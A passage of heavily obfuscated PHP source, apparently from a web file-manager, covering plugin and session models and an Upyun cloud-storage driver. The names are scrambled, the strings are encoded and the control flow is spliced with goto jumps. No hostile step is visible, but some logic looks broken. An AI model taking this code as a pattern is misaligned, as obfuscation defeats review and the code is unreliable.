$B¤×’•¡) { $AÓ‡ÉÎÉîá =& $_SERVER[Å¸ş]; if (!$this->getByTagID($bÎá‡ëˆé, $B¤×’•¡) || !$fµä…‰Äß°) { return !1; } if (!Model($AÓ‡ÉÎÉîá[755])->pathInfo($fµä…‰Äß°)) { return !1; } $EìÔĞàˆ›å = array($AÓ‡ÉÎÉîá[1427] => 0, $AÓ‡ÉÎÉîá[436] => $B¤×’•¡, $AÓ‡ÉÎÉîá[387] => $fµä…‰Äß°, $AÓ‡ÉÎÉîá[388] => $AÓ‡ÉÎÉîá[2212] . $bÎá‡ëˆé, $AÓ‡ÉÎÉîá[386] => $AÓ‡ÉÎÉîá[33], $AÓ‡ÉÎÉîá[2112] => 0); if ($this->where($EìÔĞàˆ›å)->find()) { return !1; } return $this->add($EìÔĞàˆ›å); } protected function removeFromTag($aÈˆ÷»À…ª, $F›‚‚•åÑø, $b‰ÌŠÀÛòŒ) { $dŠ¹ßÔ–È =& $_SERVER[Å¸ş]; if (!$this->getByTagID($aÈˆ÷»À…ª, $b‰ÌŠÀÛòŒ) || !$F›‚‚•åÑø) { return !1; } if (is_array($F›‚‚•åÑø)) { $F›‚‚•åÑø = array($dŠ¹ßÔ–È[7], $F›‚‚•åÑø); } $BË—ˆ»—ÑÀ = array($dŠ¹ßÔ–È[1427] => 0, $dŠ¹ßÔ–È[436] => $b‰ÌŠÀÛòŒ, $dŠ¹ßÔ–È[388] => $dŠ¹ßÔ–È[2212] . $aÈˆ÷»À…ª, $dŠ¹ßÔ–È[387] => $F›‚‚•åÑø); return $this->where($BË—ˆ»—ÑÀ)->delete(); } protected function removeByTag($B¿‹·¦¸ó—, $E¡–Á‰óä³) { $bŒğŠè©¤Õ =& $_SERVER[Å¸ş]; if (!$this->getByTagID($B¿‹·¦¸ó—, $E¡–Á‰óä³)) { return !1; } $CÆ¶Ê†ÑÄ® = array($bŒğŠè©¤Õ[1427] => 0, $bŒğŠè©¤Õ[436] => $E¡–Á‰óä³, $bŒğŠè©¤Õ[388] => $bŒğŠè©¤Õ[2212] . $B¿‹·¦¸ó—); return $this->where($CÆ¶Ê†ÑÄ®)->delete(); } protected function removeBySource($dâ·æ®­„°, $D‚ß‰åÎÃ²) { $c³§Ë¿˜Õ =& $_SERVER[Å¸ş]; if (!$dâ·æ®­„° || !$D‚ß‰åÎÃ²) { return !1; } if (is_array($D‚ß‰åÎÃ²)) { $D‚ß‰åÎÃ² = array($c³§Ë¿˜Õ[7], $D‚ß‰åÎÃ²); } $D…Àã¼¬» = array($c³§Ë¿˜Õ[1427] => 0, $c³§Ë¿˜Õ[387] => $D‚ß‰åÎÃ², $c³§Ë¿˜Õ[436] => array($c³§Ë¿˜Õ[925], 0), $c³§Ë¿˜Õ[388] => $c³§Ë¿˜Õ[2212] . $dâ·æ®­„°); return $this->where($D…Àã¼¬»)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\x70\154\165\x67\151\x6e\x4c\x69\163\x74"; public $field = array("\156\141\155\x65", "\163\x74\x61\x74\165\163", "\162\145\x67\151\x65\x73\x74", "\x63\157\x6e\146\x69\147"); public function loadList($b›„ ö§â = false) { $bßˆ‘©»ì = array_to_keyvalue($this->listData(), $_SERVER[Å¸ş][28]); if ($b›„ ö§â) { return $bßˆ‘©»ì[$b›„ ö§â]; } return $bßˆ‘©»ì; } public function init() { $Aêğ—¬•ì =& $_SERVER[Å¸ş]; Hook::trigger($Aêğ—¬•ì[2213]); $eãƒŠ²¦ø = $this->loadPluginList(); foreach ($eãƒŠ²¦ø as $EÉõªåµˆ => $BÖÁ÷•÷¼š) { $C´ˆÕ•óä = $this->appAllow($EÉõªåµˆ, $BÖÁ÷•÷¼š); if (!$C´ˆÕ•óä) { continue; } foreach ($BÖÁ÷•÷¼š[$Aêğ—¬•ì[2214]] as $dÌùå“øòÂ => $d²Î±Éã) { Hook::bind($dÌùå“øòÂ, $d²Î±Éã); } } Hook::trigger($Aêğ—¬•ì[2215]); Hook::trigger(ACTION); } public function appAllow($cââÂÑƒÑ, $bÈ¢‚½³ƒ©, $E¥µ½Åùè’ = true) { $f‡ƒ„½Ï‰ö =& $_SERVER[Å¸ş]; $bÏíõ´ÑÕ¬ = PLUGIN_DIR . $cââÂÑƒÑ . $f‡ƒ„½Ï‰ö[2216]; if (!is_array($bÈ¢‚½³ƒ©) || !is_array($bÈ¢‚½³ƒ©[$f‡ƒ„½Ï‰ö[2214]]) || !is_file($bÏíõ´ÑÕ¬) || $bÈ¢‚½³ƒ©[$f‡ƒ„½Ï‰ö[692]] != 1) { return !1; } if ($E¥µ½Åùè’ && !Action($f‡ƒ„½Ï‰ö[2217])->checkAuth($cââÂÑƒÑ)) { return !1; } return !0; } public function unInstall($aĞà½»¼ÃÛ) { $d‚—½ÅîÏ­ =& $_SERVER[Å¸ş]; $A‚àìêŞ…ˆ = $this->loadList($aĞà½»¼ÃÛ); if (file_exists(PLUGIN_DIR . $aĞà½»¼ÃÛ)) { Hook::apply($aĞà½»¼ÃÛ . $d‚—½ÅîÏ­[2218]); } $this->remove($A‚àìêŞ…ˆ[$d‚—½ÅîÏ­[367]]); } public function changeStatus($b§£¡–Úì¬, $A¦éãÎ÷) { $BÌÔ¿·ê†Í =& $_SERVER[Å¸ş]; $CÎİ”Ø¢åÜ = $this->loadList($b§£¡–Úì¬); if ($A¦éãÎ÷) { Hook::apply($b§£¡–Úì¬ . $BÌÔ¿·ê†Í[2219]); } $this->update($CÎİ”Ø¢åÜ[$BÌÔ¿·ê†Í[367]], array($BÌÔ¿·ê†Í[2220] => $A¦éãÎ÷)); } public function appRegist($CºŒ¬‚´‘Ì, $A‰ŒÏ“‹¡¢) { $CñÉ·„ˆá† =& $_SERVER[Å¸ş]; $a™ÇÈÚà© = $this->loadList($CºŒ¬‚´‘Ì); if ($a™ÇÈÚà©) { $this->update($a™ÇÈÚà©[$CñÉ·„ˆá†[367]], array($CñÉ·„ˆá†[2214] => $A‰ŒÏ“‹¡¢)); } else { $eßêÀÚÈÃ = array($CñÉ·„ˆá†[28] => $CºŒ¬‚´‘Ì, $CñÉ·„ˆá†[2214] => $A‰ŒÏ“‹¡¢, $CñÉ·„ˆá†[692] => 0, $CñÉ·„ˆá†[6] => $this->getConfigDefault($CºŒ¬‚´‘Ì)); $this->insert($eßêÀÚÈÃ); } } public function getConfigDefault($c©ÕíÇÀµ) { $bè¾²ğ¨¾” =& $_SERVER[Å¸ş]; $D¨£’à«†£ = array(); $eÉ¾ùƒ‡²… = $this->getPackageJson($c©ÕíÇÀµ); if (!$eÉ¾ùƒ‡²… && is_array($eÉ¾ùƒ‡²…[$bè¾²ğ¨¾”[2221]])) { return $D¨£’à«†£; } foreach ($eÉ¾ùƒ‡²…[$bè¾²ğ¨¾”[2221]] as $EŸš·…ŠİÒ => $A¦ŒœØãà) { if (!isset($A¦ŒœØãà[$bè¾²ğ¨¾”[359]]) || isset($D¨£’à«†£[$EŸš·…ŠİÒ])) { continue; } $D¨£’à«†£[$EŸš·…ŠİÒ] = $A¦ŒœØãà[$bè¾²ğ¨¾”[359]]; } return $D¨£’à«†£; } public function getPackageJson($Aİ¨÷èá·) { return Hook::apply($Aİ¨÷èá· . $_SERVER[Å¸ş][2222]); } public function getConfig($EÔŠ‹Ş… , $e÷Í–äÂ† = false) { $DÊ®™¸«¤ğ =& $_SERVER[Å¸ş]; $f˜ÂÆŒª¢ = array(); $e²óÅì¨ = $this->loadList($EÔŠ‹Ş… ); if ($e²óÅì¨ && is_array($e²óÅì¨[$DÊ®™¸«¤ğ[6]])) { $f˜ÂÆŒª¢ = $e²óÅì¨[$DÊ®™¸«¤ğ[6]]; } if (!$f˜ÂÆŒª¢ || $e÷Í–äÂ†) { $f˜ÂÆŒª¢ = $this->getConfigDefault($EÔŠ‹Ş… ); } return $f˜ÂÆŒª¢; } public function setConfig($B†—‚§Ã®, $BÇÍåœÀÉé = false) { goto Bœº÷ù½’–; Bœº÷ù½’–: $FÓØ§Êƒë =& $_SERVER[Å¸ş]; $a“Á¿áõƒ = $this->loadList($B†—‚§Ã®); if (!$a“Á¿áõƒ) { return !1; } goto aç¦¨Çë‰´; aç¦¨Çë‰´: $CÖ¬¥Ş¥ = $a“Á¿áõƒ[$FÓØ§Êƒë[6]]; if ($BÇÍåœÀÉé == !1) { $CÖ¬¥Ş¥ = array(); $BÇÍåœÀÉé = $this->getConfigDefault($B†—‚§Ã®); } foreach ($BÇÍåœÀÉé as $a¸’á‘²‘ => $a–İ–„ñà) { $CÖ¬¥Ş¥[$a¸’á‘²‘] = is_string($a–İ–„ñà) ? trim($a–İ–„ñà) : $a–İ–„ñà; } goto cóäóÕÒö÷; cóäóÕÒö÷: $this->update($a“Á¿áõƒ[$FÓØ§Êƒë[367]], array($FÓØ§Êƒë[6] => $CÖ¬¥Ş¥)); goto bö³Ò¯ÅÛ; bö³Ò¯ÅÛ: } public function viewList() { goto dÒ©ØÔœçŒ; dÒ©ØÔœçŒ: $f–²éÉˆÅ» =& $_SERVER[Å¸ş]; $b‚ì¡»Ş…ö = $this->loadList(); $this->pluginScan($b‚ì¡»Ş…ö); goto dß²Í®×ÌÀ; dß²Í®×ÌÀ: $b‚ì¡»Ş…ö = $this->loadPluginList(); $A¡Ô¢˜ŒÖÓ = array(); foreach ($b‚ì¡»Ş…ö as $e®Õßó­øí => $Bç‹®âë¾) { unset($Bç‹®âë¾[$f–²éÉˆÅ»[2214]], $Bç‹®âë¾[$f–²éÉˆÅ»[6]]); $BãÈ«Ñ™èâ = PLUGIN_DIR . $Bç‹®âë¾[$f–²éÉˆÅ»[28]] . $f–²éÉˆÅ»[2216]; if (!is_file($BãÈ«Ñ™èâ)) { continue; } $A‡…ª®’Â÷ = Hook::apply($Bç‹®âë¾[$f–²éÉˆÅ»[28]] . $f–²éÉˆÅ»[2222]); if (is_array($A‡…ª®’Â÷)) { $A¡Ô¢˜ŒÖÓ[$e®Õßó­øí] = array_merge($Bç‹®âë¾, $A‡…ª®’Â÷); } } goto eö”‰•õŞ; eö”‰•õŞ: return $A¡Ô¢˜ŒÖÓ; goto D»‹âİÎ¯»; D»‹âİÎ¯»: } private function loadPluginList() { $d£—Ó‡™Ô— =& $_SERVER[Å¸ş]; $D„âÕ‹Æ¯¦ = $this->loadList(); if (strtolower(MOD) == $d£—Ó‡™Ô—[2223]) { return $D„âÕ‹Æ¯¦; } $cÄù…¿™² = Hook::trigger($d£—Ó‡™Ô—[2224], $D„âÕ‹Æ¯¦); if ($D„âÕ‹Æ¯¦ && !$cÄù…¿™²) { die; } return $cÄù…¿™² ? $cÄù…¿™² : $D„âÕ‹Æ¯¦; } private function pluginScan($a—áÑ™‰‘Ê) { $dŞ‹òŸêá =& $_SERVER[Å¸ş]; recursion_dir(PLUGIN_DIR, $b’ˆ¶¹õ­, $f¬à‚èËîÈ, 0); foreach ($b’ˆ¶¹õ­ as $eÛ¥ó¦¿­) { $a‹ËïãÅ­³ = get_path_this($eÛ¥ó¦¿­); if (isset($a—áÑ™‰‘Ê[$a‹ËïãÅ­³]) || !file_exists($eÛ¥ó¦¿­ . $dŞ‹òŸêá[2225]) || !file_exists($eÛ¥ó¦¿­ . $dŞ‹òŸêá[2216])) { continue; } Hook::apply($a‹ËïãÅ­³ . $dŞ‹òŸêá[2219]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\155\x5f\x73\145\x73\163\x69\157\x6e"; public function get($CÑ¼‚ÙñÉ) { $C»âœ†èòƒ =& $_SERVER[Å¸ş]; $DïôğïõØğ = $this->where(array($C»âœ†èòƒ[2226] => $CÑ¼‚ÙñÉ))->find(); if (!is_array($DïôğïõØğ)) { return !1; } return $DïôğïõØğ[$C»âœ†èòƒ[695]]; } public function set($fÖ°Æ›ğŠ¨, $EºµñÌĞ†À, $Fí–Ùçì = 3600) { $Bõò°Õá‡à =& $_SERVER[Å¸ş]; $aŞ§’Ù‡† = array($Bõò°Õá‡à[2226] => $fÖ°Æ›ğŠ¨, $Bõò°Õá‡à[2139] => $EºµñÌĞ†À, $Bõò°Õá‡à[2227] => $Fí–Ùçì + time()); if (Session::get($Bõò°Õá‡à[2228])) { $aŞ§’Ù‡†[$Bõò°Õá‡à[1436]] = Session::get($Bõò°Õá‡à[2228]); } else { $aŞ§’Ù‡†[$Bõò°Õá‡à[1436]] = 0; } if ($this->get($fÖ°Æ›ğŠ¨)) { return $this->where(array($Bõò°Õá‡à[2226] => $fÖ°Æ›ğŠ¨))->save($aŞ§’Ù‡†); } else { return $this->add($aŞ§’Ù‡†, array(), !0); } } public function remove($FÎªÏ´µˆ) { return $this->where(array($_SERVER[Å¸ş][2226] => $FÎªÏ´µˆ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Å¸ş][2229] . time())->delete(); } } goto DŸš¼’¥ì‰; C–ÏÊåÕ: function beforeShutdownFatalError($CĞ´„˜‚ÌÅ) { think_exception($CĞ´„˜‚ÌÅ); } $_SERVER[$_SERVER[ãˆÙà–ÃÙ][45]] = $FÜ¿ËÈœ($_SERVER[$_SERVER[ãˆÙà–ÃÙ][42]]); $DİÒ»´”‚‘ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto b—¼õÒ¨‡Â; eãæÚÛó˜…: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($bŒ½Ğ‘Éôõ, $aµ‡–ÜŠ = 0) { parent::__construct(); $this->source = $bŒ½Ğ‘Éôõ; $this->sourceSize = $aµ‡–ÜŠ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($E­ğÜÁ“Àì = false) { return $this->sourceSize; } public function getContent($e‰á°øºŠñ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { if ($this->sourceSize <= 0) { return $_SERVER[Å¸ş][33]; } $FÔ§ÜğÑ»© = ftell($this->source); $AÙ—æÏÅšŠ = @fread($this->source, $this->sourceSize); fseek($this->source, $FÔ§ÜğÑ»©); return $AÙ—æÏÅšŠ; } } public function fileSubstr($b¸İˆÃãğ× = false, $fãÒ—‹Ë¯Ì = 0, $fèæ‡Œ÷ôÎ = 0) { if (!$fèæ‡Œ÷ôÎ) { $fèæ‡Œ÷ôÎ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $fãÒ—‹Ë¯Ì, $fèæ‡Œ÷ôÎ); } if ($this->sourceType == self::TYPE_FILE) { if ($fèæ‡Œ÷ôÎ <= 0) { return $_SERVER[Å¸ş][33]; } $a ¬´…Ò·¡ = ftell($this->source); fseek($this->source, $a ¬´…Ò·¡ + $fãÒ—‹Ë¯Ì); $aäˆÄì¼Ã = @fread($this->source, $fèæ‡Œ÷ôÎ); fseek($this->source, $a ¬´…Ò·¡); return $aäˆÄì¼Ã; } } public function hashMd5($B½°ÔÑ¦ùš = false) { return md5($this->getContent()); } public static function hash($C¼Ğ•Ÿó×å, $e©›ŒìŠŠ = 0) { $dî“áÛ¡ø¢ = new PathDriverStream($C¼Ğ•Ÿó×å, $e©›ŒìŠŠ); return $dî“áÛ¡ø¢->hashSimple($C¼Ğ•Ÿó×å); } public static function md5($Fêˆ˜Ó‚ˆø, $cœó Ìğƒ× = 0) { $A³……Æ¡´ = new PathDriverStream($Fêˆ˜Ó‚ˆø, $cœó Ìğƒ×); return $A³……Æ¡´->hashMd5($Fêˆ˜Ó‚ˆø); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\72\x2f\x2f\166\60\56\x61\160\151\56\165\160\x79\x75\156\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($BìÕ›—é¸) { parent::__construct(); $this->_init($BìÕ›—é¸); } public function _init($cñˆµÖ’‹é) { foreach ($cñˆµÖ’‹é as $e·ÓãÁö‹ => $dºÖÓ¼ø—Í) { if (isset($this->{$e·ÓãÁö‹})) { $this->{$e·ÓãÁö‹} = $dºÖÓ¼ø—Í; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[Å¸ş][1239], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($D›Ó¼Ÿ‡Ú¦, $eŒ‡î£×˜ = "\107\105\x54") { $B¦êŞóÂŠ =& $_SERVER[Å¸ş]; $c¯º‰ò´ª = gmdate($B¦êŞóÂŠ[1203]); $c˜í½­£Ã = base64_encode(hash_hmac($B¦êŞóÂŠ[1240], "{$eŒ‡î£×˜}\46{$D›Ó¼Ÿ‡Ú¦}\x26{$c¯º‰ò´ª}", md5("{$this->userpass}"), !0)); $CøŒª„‹ª = array("\101\165\164\150\x6f\x72\x69\x7a\x61\164\x69\x6f\x6e\72\125\x50\x59\x55\x4e\x20{$this->username}\x3a{$c˜í½­£Ã}", "\x44\141\164\x65\72{$c¯º‰ò´ª}"); return $CøŒª„‹ª; } public function ussRequest($d’ŠÑ‚Áˆ, $BÈ¼¢ø¯Î˜ = "\x47\105\124", $e¹‰ğçÔ ã = false, $D†’¹©‹âÑ = false, $b×¨‘Ì‘’ = false) { goto C­³ªèòòœ; C­³ªèòòœ: $CƒÃĞñ­Ä÷ =& $_SERVER[Å¸ş]; $d’ŠÑ‚Áˆ = trim($d’ŠÑ‚Áˆ, $CƒÃĞñ­Ä÷[8]); $C—è¢ãˆçÜ = "\x2f{$this->bucket}\57{$d’ŠÑ‚Áˆ}"; goto C±ãŒİ‰Å×; C±ãŒİ‰Å×: $fÓ·ˆ½ŒÑ = $this->ussHeaders($C—è¢ãˆçÜ, $BÈ¼¢ø¯Î˜); if ($D†’¹©‹âÑ) { $fÓ·ˆ½ŒÑ = array_merge($fÓ·ˆ½ŒÑ, $D†’¹©‹âÑ); } $BĞì›Ö«ó¸ = url_request($this->endpoint . $C—è¢ãˆçÜ, $BÈ¼¢ø¯Î˜, $e¹‰ğçÔ ã, $fÓ·ˆ½ŒÑ, $b×¨‘Ì‘’); goto f»½‹Õó “; f»½‹Õó “: if (!$BĞì›Ö«ó¸) { return array($CƒÃĞñ­Ä÷[1030] => !1, $CƒÃĞñ­Ä÷[1032] => $CƒÃĞñ­Ä÷[1241]); } if (strtolower($BÈ¼¢ø¯Î˜) == $CƒÃĞñ­Ä÷[184] || in_array($BĞì›Ö«ó¸[$CƒÃĞñ­Ä÷[1030]], array($CƒÃĞñ­Ä÷[1098], $CƒÃĞñ­Ä÷[1242]))) { $e¹‰ğçÔ ã = $BĞì›Ö«ó¸[$CƒÃĞñ­Ä÷[1243]]; } else { $e¹‰ğçÔ ã = json_decode($BĞì›Ö«ó¸[$CƒÃĞñ­Ä÷[1032]], !0); if (!$e¹‰ğçÔ ã) { $e¹‰ğçÔ ã = $BĞì›Ö«ó¸[$CƒÃĞñ­Ä÷[1032]]; } else { if (!$BĞì›Ö«ó¸[$CƒÃĞñ­Ä÷[692]] && isset($e¹‰ğçÔ ã[$CƒÃĞñ­Ä÷[1244]])) { $e¹‰ğçÔ ã = $e¹‰ğçÔ ã[$CƒÃĞñ­Ä÷[1244]]; } } } return array($CƒÃĞñ­Ä÷[1030] => $BĞì›Ö«ó¸[$CƒÃĞñ­Ä÷[692]], $CƒÃĞñ­Ä÷[1032] => $e¹‰ğçÔ ã); goto b´ŒÑ‘¿Øõ; b´ŒÑ‘¿Øõ: } public function mkfile($dÄÇŒ„¼, $c°Ò˜‘ùâô = '', $Eª–¬×…Ù = REPEAT_RENAME) { if ($this->setContent($dÄÇŒ„¼, $c°Ò˜‘ùâô)) { return $this->getPathOuter($dÄÇŒ„¼); } return !1; } public function mkdir($f àë ˜Ñ², $e´ÉÕÓÏŒŠ = REPEAT_SKIP) { $DŠõ¿ŞÏÖ =& $_SERVER[Å¸ş]; $d‹àº‚×íª = trim($f àë ˜Ñ², $DŠõ¿ŞÏÖ[8]); if ($this->_isFolder($d‹àº‚×íª)) { return $this->getPathOuter($d‹àº‚×íª); } $cÌïƒ‘·Œï = array($DŠõ¿ŞÏÖ[1245]); $d¹ïÕŸì± = $this->ussRequest($d‹àº‚×íª, $DŠõ¿ŞÏÖ[212], !1, $cÌïƒ‘·Œï); return $d¹ïÕŸì±[$DŠõ¿ŞÏÖ[1030]] ? $this->getPathOuter($d‹àº‚×íª) : !1; } public function copyFile($BŸÇö´‰ÀË, $BˆÁ•÷¥±Ú) { $FËÜÊÍé›À =& $_SERVER[Å¸ş]; $fÂÑ¯ô‹“Ñ = array($FËÜÊÍé›À[1246] . "\57{$this->bucket}\x2f{$BŸÇö´‰ÀË}", $FËÜÊÍé›À[1247]); $dƒİ«ßï¶¿ = $this->ussRequest($BˆÁ•÷¥±Ú, $FËÜÊÍé›À[214], !1, $fÂÑ¯ô‹“Ñ); return $dƒİ«ßï¶¿[$FËÜÊÍé›À[1030]] ? !0 : $this->getPathOuter($BˆÁ•÷¥±Ú); } public function moveFile($C¥Ò›Ÿ„–î, $b‘’§¨ŒÛ) { $aõã«¥‡‚… =& $_SERVER[Å¸ş]; $a„™ç¹›¥¡ = array($aõã«¥‡‚…[1248] . "\x2f{$this->bucket}\x2f{$C¥Ò›Ÿ„–î}", $aõã«¥‡‚…[1247]); $f«ÊÁìªØ = $this->ussRequest($b‘’§¨ŒÛ, $aõã«¥‡‚…[214], !1, $a„™ç¹›¥¡); return $f«ÊÁìªØ[$aõã«¥‡‚…[1030]] ? !0 : $this->getPathOuter($b‘’§¨ŒÛ); } public function delFile($a¸‚†ˆµÜŸ) { $A»ŒÚãÇ°„ =& $_SERVER[Å¸ş]; $EÃ àæØò = $this->ussRequest($a¸‚†ˆµÜŸ, $A»ŒÚãÇ°„[1249]); return $EÃ àæØò[$A»ŒÚãÇ°„[1030]] ? !0 : !1; } public function delFolder($dƒœ¿Ú—­Š) { $Eéî‘âŠ¼¾ =& $_SERVER[Å¸ş]; $fŸ¸à¶•­í = $this->listAll($dƒœ¿Ú—­Š); krsort($fŸ¸à¶•­í); foreach ($fŸ¸à¶•­í as $eĞğˆÔÍÎÉ) { $this->ussRequest($eĞğˆÔÍÎÉ[$Eéî‘âŠ¼¾[75]], $Eéî‘âŠ¼¾[1249]); } return $this->ussRequest($dƒœ¿Ú—­Š, $Eéî‘âŠ¼¾[1249]); } public function rename($b‰ò…†Ûõ, $fˆ‰ŒòÉÒ) { if ($this->isFile($b‰ò…†Ûõ)) { $fˆ‰ŒòÉÒ = get_path_father($b‰ò…†Ûõ) . $fˆ‰ŒòÉÒ; return $this->moveFile($b‰ò…†Ûõ, $fˆ‰ŒòÉÒ); } return $this->renameObject($b‰ò…†Ûõ, $fˆ‰ŒòÉÒ); } public function fileInfo($eèâ ë¾ñÍ, $cÒô‡—¿›ì = false, $FâªœËÚô = array()) { $e·ñÂ·óçƒ =& $_SERVER[Å¸ş]; if ($cÒô‡—¿›ì) { return array($e·ñÂ·óçƒ[28] => $this->pathThis($eèâ ë¾ñÍ), $e·ñÂ·óçƒ[75] => $this->getPathOuter($e·ñÂ·óçƒ[8] . $eèâ ë¾ñÍ), $e·ñÂ·óçƒ[29] => $e·ñÂ·óçƒ[167], $e·ñÂ·óçƒ[77] => isset($FâªœËÚô[$e·ñÂ·óçƒ[325]]) ? $FâªœËÚô[$e·ñÂ·óçƒ[325]] : 0, $e·ñÂ·óçƒ[160] => $this->ext($eèâ ë¾ñÍ)); } $F†©™–†â = array($e·ñÂ·óçƒ[28] => $this->pathThis($eèâ ë¾ñÍ), $e·ñÂ·óçƒ[75] => $this->getPathOuter($e·ñÂ·óçƒ[8] . $eèâ ë¾ñÍ), $e·ñÂ·óçƒ[29] => $e·ñÂ·óçƒ[167], $e·ñÂ·óçƒ[187] => 0, $e·ñÂ·óçƒ[107] => isset($cœˆ˜±¬Ó«[$e·ñÂ·óçƒ[1250]]) ? $cœˆ˜±¬Ó«[$e·ñÂ·óçƒ[1250]] : 0, $e·ñÂ·óçƒ[77] => isset($FâªœËÚô[$e·ñÂ·óçƒ[325]]) ? $FâªœËÚô[$e·ñÂ·óçƒ[325]] : 0, $e·ñÂ·óçƒ[160] => $this->ext($eèâ ë¾ñÍ), $e·ñÂ·óçƒ[188] => !0, $e·ñÂ·óçƒ[189] => !0); if (empty($FâªœËÚô)) { $FâªœËÚô = $this->objectMeta($eèâ ë¾ñÍ); if (!$FâªœËÚô) { return $F†©™–†â; } $F†©™–†â[$e·ñÂ·óçƒ[187]] = $FâªœËÚô[$e·ñÂ·óçƒ[1251]]; $F†©™–†â[$e·ñÂ·óçƒ[107]] = $FâªœËÚô[$e·ñÂ·óçƒ[1252]]; $F†©™–†â[$e·ñÂ·óçƒ[77]] = $FâªœËÚô[$e·ñÂ·óçƒ[77]]; } return $F†©™–†â; } public function folderInfo($Bƒå‡Áî, $c¥¯²‰Û³§ = false) { $aÙ˜±è­ù =& $_SERVER[Å¸ş]; if ($c¥¯²‰Û³§) { return array($aÙ˜±è­ù[28] => $this->pathThis($Bƒå‡Áî), $aÙ˜±è­ù[75] => $this->getPathOuter($aÙ˜±è­ù[8] . $Bƒå‡Áî), $aÙ˜±è­ù[29] => $aÙ˜±è­ù[76]); } $b°‰Ë‹İö¯ = array($aÙ˜±è­ù[28] => $this->pathThis($Bƒå‡Áî), $aÙ˜±è­ù[75] => $this->getPathOuter($aÙ˜±è­ù[8] . $Bƒå‡Áî), $aÙ˜±è­ù[29] => $aÙ˜±è­ù[76], $aÙ˜±è­ù[187] => 0, $aÙ˜±è­ù[107] => isset($dĞ† ¯¿‰‘[$aÙ˜±è­ù[1250]]) ? $dĞ† ¯¿‰‘[$aÙ˜±è­ù[1250]] : 0, $aÙ˜±è­ù[1160] => !0, $aÙ˜±è­ù[1161] => !0); if (empty($D—ĞèÙÃîÓ)) { $D—ĞèÙÃîÓ = $this->objectMeta($Bƒå‡Áî); if (!$D—ĞèÙÃîÓ) { return $b°‰Ë‹İö¯; } $b°‰Ë‹İö¯[$aÙ˜±è­ù[187]] = $D—ĞèÙÃîÓ[$aÙ˜±è­ù[1251]]; $b°‰Ë‹İö¯[$aÙ˜±è­ù[107]] = $D—ĞèÙÃîÓ[$aÙ˜±è­ù[1252]]; } return $b°‰Ë‹İö¯; } private function fileList($aò‰…ïŒÆ, $cŞ½Àßç° = 0, $Dº§ö¡‹š = 1000) { $B½—¥êäŠ =& $_SERVER[Å¸ş]; $BÅ–†è“æ = array($B½—¥êäŠ[1253], $B½—¥êäŠ[1254] . $Dº§ö¡‹š); if ($cŞ½Àßç°) { $BÅ–†è“æ[] = $B½—¥êäŠ[1255] . $cŞ½Àßç°; } $EÑÑ·ïø = $this->ussRequest($aò‰…ïŒÆ, $B½—¥êäŠ[216], !1, $BÅ–†è“æ); return !$EÑÑ·ïø[$B½—¥êäŠ[1030]] ? !1 : $EÑÑ·ïø[$B½—¥êäŠ[1032]]; } public function listPath($Fí¦¾ñÕ–ó, $dÚ«¡ØÎÎ¨ = false) { goto EĞÜÇ‡®¯; bõ®ÛÂ³İ: return array($dƒÔ³“ÁÇ¯[74] => $B¾¢Çª­Ñà, $dƒÔ³“ÁÇ¯[73] => $f˜‚÷ˆŸƒ‹); goto F”ƒã‰çÀ; EĞÜÇ‡®¯: $dƒÔ³“ÁÇ¯ =& $_SERVER[Å¸ş]; $D·Ş»ªÖ = $dƒÔ³“ÁÇ¯[33]; $EŸÅ›§ÅŞã = 1000; goto e÷‡ÜñÃœ¢; e÷‡ÜñÃœ¢: $B¾¢Çª­Ñà = $f˜‚÷ˆŸƒ‹ = array(); $e“òäÎİ× = rtrim($Fí¦¾ñÕ–ó, $dƒÔ³“ÁÇ¯[8]) . $dƒÔ³“ÁÇ¯[8]; while (!0) { $f¯‰ÍñÂ = $this->fileList($Fí¦¾ñÕ–ó, $D·Ş»ªÖ, $EŸÅ›§ÅŞã); if (!$f¯‰ÍñÂ) { return !1; } $D·Ş»ªÖ = isset($f¯‰ÍñÂ[$dƒÔ³“ÁÇ¯[1256]]) ? $f¯‰ÍñÂ[$dƒÔ³“ÁÇ¯[1256]] : $dƒÔ³“ÁÇ¯[33]; $EÊ‡™ùŒÌ = isset($f¯‰ÍñÂ[$dƒÔ³“ÁÇ¯[1257]]) ? $f¯‰ÍñÂ[$dƒÔ³“ÁÇ¯[1257]] : array(); foreach ($EÊ‡™ùŒÌ as $Aõè´‚õƒÙ) { if ($Aõè´‚õƒÙ[$dƒÔ³“ÁÇ¯[29]] == $dƒÔ³“ÁÇ¯[76]) { $B¾¢Çª­Ñà[] = $this->folderInfo($e“òäÎİ× . $Aõè´‚õƒÙ[$dƒÔ³“ÁÇ¯[28]], $dÚ«¡ØÎÎ¨, $Aõè´‚õƒÙ); } else { $f˜‚÷ˆŸƒ‹[] = $this->fileInfo($e“òäÎİ× . $Aõè´‚õƒÙ[$dƒÔ³“ÁÇ¯[28]], $dÚ«¡ØÎÎ¨, $Aõè´‚õƒÙ); } } if (count($EÊ‡™ùŒÌ) < $EŸÅ›§ÅŞã) { break; } } goto bõ®ÛÂ³İ; F”ƒã‰çÀ: } private function recursionAllFiles($e¢èïĞ¨ÅÇ, &$Aù‡”ôğé«) { $a„ˆ²ØçÇ =& $_SERVER[Å¸ş]; $a³ÄµÉÚ† = $a„ˆ²ØçÇ[33]; $B¤šÚÑ¤óæ = 1000; $c®¨ çÚ¤ = $CÛ‡ï¦˜ï = array(); $E­ÑÆ»¤¡ = rtrim($e¢èïĞ¨ÅÇ, $a„ˆ²ØçÇ[8]) . $a„ˆ²ØçÇ[8]; while (!0) { 